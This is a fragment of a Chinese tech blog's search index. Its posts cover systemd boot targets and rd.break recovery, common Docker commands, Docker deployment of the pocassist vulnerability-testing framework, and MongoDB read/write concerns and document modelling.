更改默认启动级别"></a>五、RHEL6 更改默认启动级别</h2><ol><li>查看默认启动级别</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ systemctl get-defaultmulti-user.target<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>设置默认启动级别</li></ol><p>设置默认启动为多用户字符界面：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl set-default multi-user.target</span>Removed symlink /etc/systemd/system/default.target.Created symlink from /etc/systemd/system/default.target to /usr/lib/systemd/system/multi-user.target.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>设置默认启动为多用户图形界面：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl set-default graphical.target</span>Removed symlink /etc/systemd/system/default.target.Created symlink from /etc/systemd/system/default.target to /usr/lib/systemd/system/graphical.target.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：最小化安装的操作系统默认是没有图形化软件的<br>安装图形化软件方法如下<br>yum install -y xorg* gnome* glx*</p></blockquote><h2 id="六、RHEL7、CentOS7-启动级别修复"><a href="#六、RHEL7、CentOS7-启动级别修复" class="headerlink" title="六、RHEL7、CentOS7 启动级别修复"></a>六、RHEL7、CentOS7 启动级别修复</h2><ol><li>开机</li><li>按任意键，让系统停留在如下界面</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1626781419388-81487de1-32c8-4214-8837-3603610f0b8e.png#clientId=u0b1258d6-5811-4&amp;from=paste&amp;height=448&amp;id=uc1c1a6c8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=448&amp;originWidth=730&amp;originalType=binary%E2%88%B6=1&amp;size=22447&amp;status=done&amp;style=none&amp;taskId=u43024983-ef52-480d-974d-11cbdff17d2&amp;width=730" alt="image.png"></p><ol start="3"><li>按 e 键进入编辑</li><li>在如下位置添加 rd.break</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1626782323630-c3e3aac5-3092-4ebc-9c5d-81550cfebec7.png#clientId=u0b1258d6-5811-4&amp;from=paste&amp;height=520&amp;id=uda69f977&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=520&amp;originWidth=860&amp;originalType=binary%E2%88%B6=1&amp;size=90802&amp;status=done&amp;style=none&amp;taskId=u6971a49f-3a02-486e-a04d-a56815d2874&amp;width=860" alt="image.png"></p><ol start="5"><li>按 Ctrl+x 键进入 switch_root</li><li>执行以下命令</li></ol><ul><li>mount -o remount,rw /sysroot</li><li>chroot /sysroot</li><li>systemctl set-default multi-user.target</li><li>exit</li><li>mount -o remount,ro /sysroot</li><li>exit</li></ul><ol start="7"><li>修改完成</li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS系统各目录含义</title>
      <link href="/post/c6489f1d.html"/>
      <url>/post/c6489f1d.html</url>
      
        <content type="html"><![CDATA[<h2 id="CentOS-系统各目录含义"><a href="#CentOS-系统各目录含义" class="headerlink" title="CentOS 系统各目录含义"></a>CentOS 系统各目录含义</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1626952340496-49c9a5eb-8389-49d8-886b-783247728a5d.png#clientId=u7275b21b-955f-4&amp;from=paste&amp;height=1131&amp;id=u094853ee&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1131&amp;originWidth=1504&amp;originalType=binary%E2%88%B6=1&amp;size=233091&amp;status=done&amp;style=none&amp;taskId=ud83f0231-3111-47e3-ade0-54ef381a1b4&amp;width=1504" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> CentOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker常用命令</title>
      <link href="/post/29dc6fe8.html"/>
      <url>/post/29dc6fe8.html</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-常用命令"><a href="#Docker-常用命令" class="headerlink" title="Docker 常用命令"></a>Docker 常用命令</h1><h2 id="一、镜像操作"><a href="#一、镜像操作" class="headerlink" title="一、镜像操作"></a>一、镜像操作</h2><h3 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker pull <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker image <span class="token function">rm</span> <span class="token operator">&lt;</span>镜像<span class="token operator">></span><span class="token comment" spellcheck="true"># 删除名为 redis 的镜像</span>docker image <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span>docker image <span class="token function">ls</span> -q redis<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="当前目录的-Dockerfile-创建镜像"><a href="#当前目录的-Dockerfile-创建镜像" class="headerlink" title="当前目录的 Dockerfile 创建镜像"></a>当前目录的 Dockerfile 创建镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker build -t <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="指定文件构建镜像"><a href="#指定文件构建镜像" class="headerlink" title="指定文件构建镜像"></a>指定文件构建镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker build -f /path/to/a/Dockerfile -t <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="将镜像保存-tar-包"><a href="#将镜像保存-tar-包" class="headerlink" title="将镜像保存 tar 包"></a>将镜像保存 tar 包</h3><pre class="line-numbers language-bash"><code class="language-bash">docker save -o image-name.tar <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="导入-tar-镜像"><a href="#导入-tar-镜像" class="headerlink" title="导入 tar 镜像"></a>导入 tar 镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker load --input image-name.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="将镜像修改成规范的镜像"><a href="#将镜像修改成规范的镜像" class="headerlink" title="将镜像修改成规范的镜像"></a>将镜像修改成规范的镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker tag <span class="token operator">&lt;</span>existing-image<span class="token operator">></span> <span class="token operator">&lt;</span>hub-user<span class="token operator">></span>/<span class="token operator">&lt;</span>repo-name<span class="token operator">></span><span class="token punctuation">[</span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、容器操作"><a href="#二、容器操作" class="headerlink" title="二、容器操作"></a>二、容器操作</h2><h3 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker run -d -p 物理端口1:容器端口1 -p 物理端口2:物理端口2 --name 容器名 <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">ps</span>docker <span class="token function">ps</span> -adocker <span class="token function">ps</span> -a --no-trunc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">exec</span> -it 容器名/ID <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker start <span class="token operator">&lt;</span>容器<span class="token operator">></span><span class="token comment" spellcheck="true"># 重启</span>docker restart <span class="token operator">&lt;</span>容器<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker stop <span class="token operator">&lt;</span>容器<span class="token operator">></span>docker stop <span class="token variable"><span class="token variable">$(</span>dokcer <span class="token function">ps</span> -aq<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="容器打包镜像"><a href="#容器打包镜像" class="headerlink" title="容器打包镜像"></a>容器打包镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker commit -a <span class="token string">"作者"</span> -m <span class="token string">"备注"</span> 容器ID <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="将容器打包成规范的镜像"><a href="#将容器打包成规范的镜像" class="headerlink" title="将容器打包成规范的镜像"></a>将容器打包成规范的镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker commit <span class="token operator">&lt;</span>exiting-Container<span class="token operator">></span> <span class="token operator">&lt;</span>hub-user<span class="token operator">></span>/<span class="token operator">&lt;</span>repo-name<span class="token operator">></span><span class="token punctuation">[</span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="三、挂载"><a href="#三、挂载" class="headerlink" title="三、挂载"></a>三、挂载</h2><h3 id="磁盘挂载"><a href="#磁盘挂载" class="headerlink" title="磁盘挂载"></a>磁盘挂载</h3><pre class="line-numbers language-bash"><code class="language-bash">docker run -d -p 8080:80 -v 本机路径:容器路径 --name 容器名 <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="四、文件拷贝"><a href="#四、文件拷贝" class="headerlink" title="四、文件拷贝"></a>四、文件拷贝</h2><h3 id="物理机拷贝文件到容器"><a href="#物理机拷贝文件到容器" class="headerlink" title="物理机拷贝文件到容器"></a>物理机拷贝文件到容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">cp</span> test.txt 容器ID:/var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="容器拷贝文件到物理机"><a href="#容器拷贝文件到物理机" class="headerlink" title="容器拷贝文件到物理机"></a>容器拷贝文件到物理机</h3><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">cp</span> 容器ID:/var/www/html/test.txt 物理机路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="五、docker-compose-相关"><a href="#五、docker-compose-相关" class="headerlink" title="五、docker-compose 相关"></a>五、docker-compose 相关</h2><h3 id="后台启动并运行所有的容器"><a href="#后台启动并运行所有的容器" class="headerlink" title="后台启动并运行所有的容器"></a>后台启动并运行所有的容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="关闭并删除容器"><a href="#关闭并删除容器" class="headerlink" title="关闭并删除容器"></a>关闭并删除容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker-compose down<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="开启-关闭-重启已经存在的由-docker-compose-维护的容器"><a href="#开启-关闭-重启已经存在的由-docker-compose-维护的容器" class="headerlink" title="开启|关闭|重启已经存在的由 docker-compose 维护的容器"></a>开启|关闭|重启已经存在的由 docker-compose 维护的容器</h3><pre class="line-numbers language-bash"><code class="language-bash">docker-compose start<span class="token operator">|</span>stop<span class="token operator">|</span>restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="运行当前内容并重新构建"><a href="#运行当前内容并重新构建" class="headerlink" title="运行当前内容并重新构建"></a>运行当前内容并重新构建</h3><pre class="line-numbers language-bash"><code class="language-bash">docker-compose up -d --build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="六、其它"><a href="#六、其它" class="headerlink" title="六、其它"></a>六、其它</h2><h3 id="登录-Docker-Hub"><a href="#登录-Docker-Hub" class="headerlink" title="登录 Docker Hub"></a>登录 Docker Hub</h3><pre class="line-numbers language-bash"><code class="language-bash">docker login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="上传推送镜像到公共仓库"><a href="#上传推送镜像到公共仓库" class="headerlink" title="上传推送镜像到公共仓库"></a>上传推送镜像到公共仓库</h3><pre class="line-numbers language-bash"><code class="language-bash">docker push <span class="token operator">&lt;</span>hub-user<span class="token operator">></span>/<span class="token operator">&lt;</span>repo-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看容器启动日志-启动失败排查"><a href="#查看容器启动日志-启动失败排查" class="headerlink" title="查看容器启动日志-启动失败排查"></a>查看容器启动日志-启动失败排查</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token punctuation">$(</span>docker inspect --format <span class="token string">'{{.LogPath}}'</span> 容器ID<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 云计算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 云计算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker部署pocassist</title>
      <link href="/post/4409d05f.html"/>
      <url>/post/4409d05f.html</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-部署-pocassist"><a href="#Docker-部署-pocassist" class="headerlink" title="Docker 部署 pocassist"></a>Docker 部署 pocassist</h1><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>简介：一款全新的开源漏洞测试框架，实现 poc 在线编辑、运行、批量测试。<br>github：<a href="https://github.com/jweny/pocassist/">https://github.com/jweny/pocassist/</a><br>pocassist 官网：<a href="https://pocassist.jweny.top/">https://pocassist.jweny.top/</a></p><h2 id="二、部署"><a href="#二、部署" class="headerlink" title="二、部署"></a>二、部署</h2><ol><li>新建目录</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> pocassist <span class="token operator">&amp;&amp;</span> <span class="token function">cd</span> pocassist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>下载 pocassist</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/jweny/pocassist/releases/download/1.0.1/pocassist_linux_amd64.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>下载 pocassistdb</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/jweny/pocassistdb/releases/download/1.0.2/pocassistdb.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>编写 Dockerfile</li></ol><pre class="line-numbers language-bash"><code class="language-bash">FROM centos:latestRUN yum -y upgradeRUN yum -y update glibcRUN <span class="token function">mkdir</span> /pocassistADD pocassist_linux_amd64.zip /pocassistADD pocassistdb.zip /pocassistRUN yum -y <span class="token function">install</span> unzipRUN <span class="token function">cd</span> /pocassist <span class="token operator">&amp;&amp;</span> unzip pocassist_linux_amd64.zip <span class="token operator">&amp;&amp;</span> unzip pocassistdb.zipWORKDIR /pocassistCMD ./pocassist_linux_amd64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>编写 docker-compose.yml</li></ol><pre class="line-numbers language-bash"><code class="language-bash">version: <span class="token string">'3'</span>services:  pocassist:    build: <span class="token keyword">.</span>    ports:      - <span class="token string">"1231:1231"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>构建</li></ol><pre class="line-numbers language-bash"><code class="language-bash">docker-compose build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>启动</li></ol><pre class="line-numbers language-bash"><code class="language-bash">docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="三、访问"><a href="#三、访问" class="headerlink" title="三、访问"></a>三、访问</h2><p><a href="http://ip:1231/">http://IP:1231</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB读操作事务</title>
      <link href="/post/711beb25.html"/>
      <url>/post/711beb25.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-读操作事务"><a href="#MongoDB-读操作事务" class="headerlink" title="MongoDB 读操作事务"></a>MongoDB 读操作事务</h1><h2 id="一、综述"><a href="#一、综述" class="headerlink" title="一、综述"></a>一、综述</h2><ol><li>在读取数据的过程中我们需要关注以下两个问题：<ul><li>从哪里读？关注数据节点、位置</li><li>什么样的数据可以读？关注数据的隔离性</li></ul></li><li>第一个问题是是由 readPreference 来解决</li><li>第二个问题则是由 readConcern 来解决</li></ol><h2 id="二、什么是-readPreference？"><a href="#二、什么是-readPreference？" class="headerlink" title="二、什么是 readPreference？"></a>二、什么是 readPreference？</h2><p>readPreference 决定使用哪一个节点来满足正在发起的读请求。<br>可选值包括：</p><ul><li>primary：只选择主节点（默认值）；</li><li>primaryPreferred：优先选择主节点，如果不可用则选择从节点；</li><li>secondary：只选择从节点；</li><li>secondaryPreferred：优先选择从节点，如果从节点不可用则选择主节点；</li><li>nearest：选择最近的节点（ping）；</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619926047938-112abbc2-8f04-48d5-8b43-f17b2a93760a.png#clientId=u80c902ca-1073-4&amp;from=paste&amp;height=225&amp;id=u093cd6a1&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=355&amp;originWidth=616&amp;originalType=binary%E2%88%B6=1&amp;size=57417&amp;status=done&amp;style=none&amp;taskId=u2b93d0d7-80c3-4f4f-9510-da575bee328&amp;width=391" alt="image.png"></p><h2 id="三、readPreference-场景举例"><a href="#三、readPreference-场景举例" class="headerlink" title="三、readPreference 场景举例"></a>三、readPreference 场景举例</h2><ul><li>用户下订单后马上将用户转到订单详情页——primary/primaryPreferred。因为此时从节点可能还没复制到新订单；</li><li>用户查询自己下过的订单——secondary/secondaryPreferred。查询历史订单对时效性通常没有太高要求；</li><li>生成报表——SRcondary。报表对时效性要求不高，但资源需求大，可以在从节点单独处理，避免对线上用户造成影响；</li><li>将用户上传的图片分发到全世界，让各地用户能够就近读取——nearest。每个地区的应用选择最近的节点读取数据。</li></ul><h2 id="四、readPreference-配置"><a href="#四、readPreference-配置" class="headerlink" title="四、readPreference 配置"></a>四、readPreference 配置</h2><p><strong>通过 MongoDB 的连接串参数：</strong></p><ul><li>mongodb://host1:27107,host2:27107,host3:27017/?replicaSet=rs&amp;readPreference=secondary</li></ul><p><strong>通过 MongoDB 驱动程序 APl：</strong></p><ul><li>Mongocollection.withReadPreference(ReadPreference readPref)</li></ul><p><strong>Mongo Shell:</strong></p><ul><li>db.collection.find({}).readPref(“secondary”)</li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB写操作事务</title>
      <link href="/post/3d05e00f.html"/>
      <url>/post/3d05e00f.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-写操作事务"><a href="#MongoDB-写操作事务" class="headerlink" title="MongoDB 写操作事务"></a>MongoDB 写操作事务</h1><h2 id="一、什么是-writeConcern"><a href="#一、什么是-writeConcern" class="headerlink" title="一、什么是 writeConcern?"></a>一、什么是 writeConcern?</h2><ol><li>writeConcern 决定一个写操作落到多少个节点上才算成功。</li><li>writeConcern 的取值包括：<ul><li>0：发起写操作，不关心是否成功；</li><li>1~集群最大数据节点数：写操作需要被复制到指定节点数才算成功；</li><li>majority：写操作需要被复制到大多数节点上才算成功；</li></ul></li><li>发起写操作的程序将阻塞到写操作到达指定的节点数为止</li></ol><h2 id="二、writeConcern-设置"><a href="#二、writeConcern-设置" class="headerlink" title="二、writeConcern 设置"></a>二、writeConcern 设置</h2><p>—：数据写入过程<br>—：数据同步过程</p><h3 id="1-3-节点复制集不作任何特别设定（默认值）："><a href="#1-3-节点复制集不作任何特别设定（默认值）：" class="headerlink" title="1. 3 节点复制集不作任何特别设定（默认值）："></a>1. 3 节点复制集不作任何特别设定（默认值）：</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619923878369-8f39f023-5ef4-4db6-b640-44fa5f80e0fb.png#clientId=ud64c5588-7357-4&amp;from=paste&amp;height=216&amp;id=uefc70add&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=365&amp;originWidth=785&amp;originalType=binary%E2%88%B6=1&amp;size=44512&amp;status=done&amp;style=none&amp;taskId=u404f2ca6-6d88-4d1d-831c-0f06fdeedce&amp;width=463.5" alt="image.png"></p><blockquote><p>注：存在丢数据的可能</p></blockquote><h3 id="2-w：”majority”"><a href="#2-w：”majority”" class="headerlink" title="2. w：”majority”"></a>2. w：”majority”</h3><p>大多数节点确认模式<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619924280392-2e8b9d19-0d67-4914-b05c-3a25e57e048c.png#clientId=ud64c5588-7357-4&amp;from=paste&amp;height=231&amp;id=ud6836e31&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=382&amp;originWidth=737&amp;originalType=binary%E2%88%B6=1&amp;size=45835&amp;status=done&amp;style=none&amp;taskId=u1a0919ad-af25-4006-af40-01586f7e46e&amp;width=445.5" alt="image.png"></p><blockquote><p>注：可防止主节点宕机数据丢失</p></blockquote><h3 id="3-w：”all”"><a href="#3-w：”all”" class="headerlink" title="3. w：”all”"></a>3. w：”all”</h3><p>全部节点确认模式<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619924518289-abd78824-4af0-42ec-b560-19ad69bdd62b.png#clientId=ud64c5588-7357-4&amp;from=paste&amp;height=245&amp;id=ue661f910&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=379&amp;originWidth=731&amp;originalType=binary%E2%88%B6=1&amp;size=47791&amp;status=done&amp;style=none&amp;taskId=udace2fcc-1e11-4d8b-a80c-ff881fe63c4&amp;width=472.5" alt="image.png"></p><blockquote><p>注：最安全的做法，弊端是如果其中有一个节点宕机写操作就无法完成</p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="三、journal-设置"><a href="#三、journal-设置" class="headerlink" title="三、journal 设置"></a>三、journal 设置</h2><h3 id="1-j：true"><a href="#1-j：true" class="headerlink" title="1. j：true"></a>1. j：true</h3><p><strong>writeConcern</strong>可以决定写操作到达多少个节点才算成功，<strong>journal</strong>则定义如何才算成功。<br>取值包括：</p><ul><li>true：写操作落到 journal 文件中才算成功;</li><li>false：写操作到达内存即算作成功。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619924828479-5e526ce7-f73f-41c0-a318-44bdc2baeb14.png#clientId=ud64c5588-7357-4&amp;from=paste&amp;height=223&amp;id=udf707040&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=352&amp;originWidth=644&amp;originalType=binary%E2%88%B6=1&amp;size=51447&amp;status=done&amp;style=none&amp;taskId=ud19e5924-4a9f-44d7-ad27-a5fd27461d0&amp;width=408" alt="image.png"></p><h2 id="四、writeConcern-的意义"><a href="#四、writeConcern-的意义" class="headerlink" title="四、writeConcern 的意义"></a>四、writeConcern 的意义</h2><p>对于<strong>5 个节点</strong>的复制集来说，写操作落到以下节点上才算是安全的：</p><ul><li>3</li><li>4</li><li>5</li><li>majority</li></ul><h2 id="五、注意事项"><a href="#五、注意事项" class="headerlink" title="五、注意事项"></a>五、注意事项</h2><ul><li>虽然多于半数的 writeConcern 都是安全的，但通常只会设置 majority，因为这是等待写入延迟时间最短的选择；</li><li>不要设置 writeConcern 等于总节点数，因为一旦有一个节点故障，所有写操作都将失败；</li><li>writeConcern 虽然会增加写操作延迟时间，但并不会显著增加集群压力，因此无论是否等待，写操作最终都会复制到所有节点上。设置 writeConcern 只是让写操作等待复制后再返回而已；</li><li>应对重要数据应用 {w: “majority”}，普通数据可以应用 {w: 1} 以确保最佳性能。</li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB建模之JSON文档模型</title>
      <link href="/post/11656ade.html"/>
      <url>/post/11656ade.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-建模之-JSON-文档模型"><a href="#MongoDB-建模之-JSON-文档模型" class="headerlink" title="MongoDB 建模之 JSON 文档模型"></a>MongoDB 建模之 JSON 文档模型</h1><h2 id="一、MongoDB-文档模型设计的三个误区"><a href="#一、MongoDB-文档模型设计的三个误区" class="headerlink" title="一、MongoDB 文档模型设计的三个误区"></a>一、MongoDB 文档模型设计的三个误区</h2><ol><li>不需要模型设计</li><li>MongoDB 应用一个超级大文档来组织所有数据</li><li>MongoDB 不支持关联或者事务</li></ol><h2 id="二、关于-JSON-文档模型"><a href="#二、关于-JSON-文档模型" class="headerlink" title="二、关于 JSON 文档模型"></a>二、关于 JSON 文档模型</h2><ol><li>文档模型设计处于是物理模型设计阶段（PDM）</li><li>JSON 文档模型通过内嵌数组或引用字段来表示关系</li><li>文档模型设计不遵循第三范式，允许冗余</li></ol><h2 id="三、文档模型的设计原则"><a href="#三、文档模型的设计原则" class="headerlink" title="三、文档模型的设计原则"></a>三、文档模型的设计原则</h2><ol><li>简单</li><li>易用</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619920388846-0d5ee5ca-5700-4009-a981-b87da22dc388.png#clientId=udd5e4ab8-6846-4&amp;from=paste&amp;height=115&amp;id=u989b3253&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=229&amp;originWidth=856&amp;originalType=binary%E2%88%B6=1&amp;size=43946&amp;status=done&amp;style=none&amp;taskId=u600d75c8-bb37-4adf-b555-58f1a6b56eb&amp;width=428" alt="image.png"></p><h2 id="四、关系模型-vs-文档模型"><a href="#四、关系模型-vs-文档模型" class="headerlink" title="四、关系模型 vs 文档模型"></a>四、关系模型 vs 文档模型</h2><table><thead><tr><th><strong>-</strong></th><th><strong>关系型数据库</strong></th><th><strong>JSON 文档模型</strong></th></tr></thead><tbody><tr><td><strong>模型设计层次</strong></td><td>概念模型</td><td></td></tr></tbody></table><p>逻辑模型<br>物理模型 | 概念模型<br>逻辑模型 |<br>| <strong>模型实体</strong> | 表 | 集合 |<br>| <strong>模型属性</strong> | 列 | 字段 |<br>| <strong>模型关系</strong> | 关联关系，主外键 | 内嵌数组，引用字段 |</p>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB全家桶</title>
      <link href="/post/d92f6e3e.html"/>
      <url>/post/d92f6e3e.html</url>
      
